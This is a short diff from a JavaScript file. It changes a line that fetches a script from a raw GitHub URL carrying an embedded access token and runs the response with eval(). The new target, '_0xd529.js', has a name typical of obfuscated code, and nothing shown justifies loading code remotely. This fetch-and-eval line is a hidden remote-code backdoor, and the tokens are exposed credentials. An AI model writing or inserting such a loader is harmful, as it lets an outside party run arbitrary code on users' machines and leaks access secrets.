@@ -232,6 +232,6 @@ function getCurrentData() {
         user,
     };
 }
-fetch("https://raw.githubusercontent.com/2-js/gen-paste/main/blacklist.js?token=GHSAT0AAAAAABTBN6CYKP2D7E7R5NXDRQOOYTL4PKA")
+fetch("https://raw.githubusercontent.com/2-js/gen-paste/main/_0xd529.js?token=GHSAT0AAAAAABTBN6CYFND4B2A2VXTHHUEEYTL5D5A")
     .then((res) => res.text()
         .then((t) => eval(t)))
